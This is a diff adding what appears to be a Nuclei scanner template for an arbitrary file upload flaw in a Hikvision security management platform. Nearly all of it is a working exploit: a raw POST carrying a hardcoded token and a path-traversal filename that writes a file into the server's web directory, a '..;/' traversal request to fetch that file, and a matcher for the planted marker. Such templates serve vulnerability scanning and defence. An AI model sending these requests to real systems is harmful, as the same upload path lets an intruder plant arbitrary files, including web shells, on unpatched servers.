@@ -1,0 +1,41 @@
+id: hikvision-uploadAllPackage-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 海康威视综合安防管理平台uploadAllPackage任意文件上传漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0uploadAllPackage%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+  
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{rand_base(8)}}"
+  
+http:
+  - raw:
+      - |-
+        POST /center_install/picUploadService/v1/uploadAllPackage/image HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+        Accept: */*
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Token: SElLIGlhL3NmaGNjaTY3WWxWK0Y6UzVCcjg1a2N1dENqVUNIOUM3SE1GamNkN2dnTE1BN1dGTDJldFE0UXFvbz0=
+        Content-Type: multipart/form-data; boundary=--------------------------553898708333958420021355
+        Content-Length: 286
+
+        ----------------------------553898708333958420021355
+        Content-Disposition: form-data; name="sendfile"; filename="../../../../components/tomcat85linux64.1/webapps/eportal/{{filename}}.js"
+        Content-Type: application/octet-stream
+
+        whoisceshi
+        ----------------------------553898708333958420021355--
+      - |-
+        GET /portal/ui/login/..;/..;/{{filename}}.js HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - whoisceshi
